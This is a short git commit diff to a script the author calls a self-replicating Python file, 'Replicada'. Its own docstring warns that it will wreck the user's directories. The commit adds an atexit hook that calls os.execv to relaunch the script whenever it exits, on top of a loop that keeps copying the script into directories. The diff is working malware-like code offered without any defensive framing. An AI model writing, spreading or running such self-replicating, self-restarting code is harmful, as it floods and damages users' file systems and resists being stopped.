0deb74516ba327c29dea6615a29bb137ed31b953
Kamilla Youver / Archisha <95626487+archisha69@users.noreply.github.com>
2022-09-04 18:29:37 +0800

    atexit

--- main.py
+++ main.py
@@ -7,8 +7,11 @@ PLEASE MIND THAT THIS WOULD FUCK UP YOUR DIRECTORIES, INCLUDING FILES AND FOLDER
 self-replicating python file - Replicada by archisha69
 '''
 
-import os, shutil, random, string, sys
+import os, shutil, random, string, sys, atexit
 
+def _atexit():
+    os.execv(sys.argv[0], sys.argv)
+    
 cwd = os.getcwd()
 
 count = 0
@@ -21,3 +24,6 @@ while True:
     shutil.copy(f"../{sys.argv[0]}", os.getcwd())
     os.chdir(cwd)
     count += 1
+
+    atexit.register(_atexit)
+    
